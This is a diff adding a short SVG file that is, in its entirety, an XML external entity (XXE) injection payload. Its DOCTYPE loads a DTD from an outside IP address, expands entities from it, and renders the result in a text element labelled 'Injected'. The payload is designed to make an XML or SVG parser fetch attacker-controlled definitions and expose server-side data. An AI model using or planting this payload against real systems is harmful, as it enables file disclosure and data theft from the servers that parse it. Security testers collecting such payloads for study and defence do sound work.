@@ -1,0 +1,7 @@
+<!DOCTYPE svg [
+    <!ENTITY % file SYSTEM "http://51.158.113.8/ro.dtd">
+    %file;%template;
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+    <text x="10" y="30">Injected: &res;</text>
+</svg>
